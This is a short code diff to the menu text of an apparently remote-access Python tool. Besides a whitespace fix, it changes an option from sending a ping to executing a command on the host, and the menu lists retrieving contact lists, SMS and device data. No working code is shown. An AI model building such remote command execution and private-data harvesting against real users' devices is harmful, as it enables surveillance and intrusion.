@@ -57,7 +57,7 @@ def recuperaData():
         (6) go back to menu
         (7) exit
         """
-        
+
         errorSeleccion = "Please use an available integer from the list above\n"
         print(mensajePrimitivas)
 
@@ -107,7 +107,7 @@ def seleccionPrimitivas():
         (2) get contact list
         (3) get sms list
         (4) get device data
-        (5) send ping to host
+        (5) execute a command on host
         (6) go back to menu
         (7) exit
         """
